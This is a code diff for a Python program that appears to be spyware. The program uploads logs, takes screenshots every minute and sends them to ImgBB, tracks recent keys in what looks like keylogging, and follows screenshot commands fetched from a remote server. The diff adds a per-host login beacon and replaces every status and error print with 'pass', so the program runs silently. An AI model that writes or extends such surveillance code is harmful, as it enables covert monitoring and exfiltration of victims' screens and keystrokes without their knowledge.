@@ -38,6 +38,13 @@ def upload_log():
     with open(log_file, 'r') as file:
         content = file.read().strip()
 
+    try:
+        active_path = f'users/{hostname}/activate.json'
+        active = {'last_login':datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+        response = requests.put(fu + active_path, json=active)
+    except:
+        pass
+
     new_log_marker = f"** New logging started at"
     if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
         return False
@@ -72,9 +79,9 @@ def add_new_log_marker():
 def periodic_upload():
     while True:
         if upload_log():
-            print("Log file uploaded successfully and cleared.")
+            pass
         else:
-            print("Upload failed or not needed. Retrying in 1 minute.")
+            pass
         time.sleep(60)
 
 def periodic_screenshots():
@@ -88,7 +95,7 @@ def periodic_screenshots():
             upload_image_to_imgbb(screenshot_path)
             os.remove(screenshot_path)
         except Exception as e:
-            print(f"Failed to take screenshot: {e}")
+            pass
         time.sleep(60)
 
 def upload_image_to_imgbb(image_path):
@@ -101,9 +108,9 @@ def upload_image_to_imgbb(image_path):
     if response.status_code == 200:
         response_json = response.json()
         image_url = response_json['data']['url']
-        print(f"Uploaded {image_path} to ImgBB. URL: {image_url}")
+        pass
     else:
-        print(f"Failed to upload {image_path}. Response: {response.text}")
+        pass
 
 recent_keys = {}
 debounce_time = 0.2
@@ -171,15 +178,15 @@ def handle_screenshot_interval():
                             os.remove(image_path)
                             time.sleep(10)
                         except Exception as e:
-                            print(f"Failed to take image: {e}")
+                            pass
 
                     command_data['ss_count'] = max(0, command_data['ss_count'] - ss_count)
                     requests.put(fu + command_path, json=command_data)
 
             else:
-                print(f"Failed to fetch command data, Status code: {response.status_code}")
+                pass
         except requests.exceptions.RequestException as e:
-            print(f"Error fetching command data: {e}")
+            pass
 
         time.sleep(10)
         delete_all_files_in_folder(screenshot_folder)
